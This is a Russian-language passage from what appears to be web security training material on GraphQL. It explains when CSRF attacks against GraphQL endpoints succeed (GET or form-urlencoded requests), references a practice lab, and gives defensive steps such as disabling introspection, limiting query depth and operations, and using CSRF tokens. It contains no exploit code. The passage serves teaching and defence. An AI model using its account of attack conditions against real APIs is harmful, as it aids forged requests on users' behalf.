POST-запросы, использующие content-type application/json, защищены от подделки, пока тип содержимого проверяется. В этом случае злоумышленник не сможет заставить браузер жертвы отправить этот запрос, даже если жертва посетит вредоносный сайт.

Однако альтернативные методы, такие как GET, или любой запрос, имеющий content-type x-www-form-urlencoded, могут быть отправлены браузером и поэтому могут оставлять пользователей уязвимыми для атак, если конечная точка принимает такие запросы. Когда это так, злоумышленники могут создавать эксплойты для отправки вредоносных запросов к API.

Шаги по построению CSRF-атаки и доставке эксплойта одинаковы для уязвимостей CSRF на основе GraphQL и для «обычных» уязвимостей CSRF. Для получения дополнительной информации об этом процессе см. «Как построить CSRF-атаку».
text

ЛАБОРАТОРНАЯ
PRACTITIONER
Выполнение CSRF-эксплойтов через GraphQL
Не решена

Предотвращение атак на GraphQL

Чтобы предотвратить многие распространенные атаки на GraphQL, выполните следующие шаги при развертывании вашего API в production:

    Если ваш API не предназначен для общего пользования, отключите на нем интроспекцию. Это усложняет злоумышленнику получение информации о работе API и снижает риск нежелательного раскрытия информации.

        Информацию о том, как отключить интроспекцию в платформе Apollo GraphQL, см. в этом блоге.

    Если ваш API предназначен для общего пользования, то вам, вероятно, нужно оставить интроспекцию включенной. Однако вы должны просмотреть схему API, чтобы убедиться, что она не раскрывает непреднамеренные поля публично.

    Убедитесь, что подсказки отключены. Это предотвращает возможность использования злоумышленниками Clairvoyance или подобных инструментов для получения информации о базовой схеме.

        Вы не можете напрямую отключить подсказки в Apollo. См. эту ветку на GitHub для обходного решения.

    Убедитесь, что схема вашего API не раскрывает никаких приватных полей пользователя, таких как адреса электронной почты или идентификаторы пользователей.

Предотвращение атак перебором на GraphQL

Иногда возможно обойти стандартное ограничение скорости при использовании GraphQL API. Для примера этого см. раздел «Обход ограничения скорости с использованием псевдонимов».

Имея это в виду, есть шаги по проектированию, которые вы можете предпринять, чтобы защитить ваш API от атак перебором. Это обычно включает ограничение сложности запросов, принимаемых API, и сокращение возможностей для злоумышленников выполнять атаки на отказ в обслуживании (DoS).

Для защиты от атак перебором:

    Ограничьте глубину запроса (query depth) вашего API. Термин «глубина запроса» относится к количеству уровней вложенности в запросе. Сильно вложенные запросы могут иметь значительные последствия для производительности и потенциально предоставить возможность для DoS-атак, если они принимаются. Ограничивая глубину запроса, которую принимает ваш API, вы можете снизить вероятность этого.

    Настройте ограничения на операции (operation limits). Ограничения операций позволяют вам настроить максимальное количество уникальных полей, псевдонимов и корневых полей, которые ваш API может принять.

    Настройте максимальное количество байт, которое может содержать запрос.

    Рассмотрите возможность внедрения анализа стоимости (cost analysis) в ваш API. Анализ стоимости — это процесс, при котором библиотечное приложение определяет стоимость ресурсов, связанную с выполнением запросов по мере их получения. Если запрос будет слишком сложным для выполнения, API отклоняет его.

Дополнительная информация

Для информации о том, как реализовать эти функции в Apollo, см. этот блог.
Предотвращение CSRF в GraphQL

Чтобы защититься от уязвимостей CSRF в GraphQL, убедитесь в следующем при проектировании вашего API:

    Ваш API принимает запросы только через JSON-кодированные POST.

    API проверяет, что предоставленное содержимое соответствует указанному типу содержимого (content-type).

    API имеет безопасный механизм CSRF-токенов.
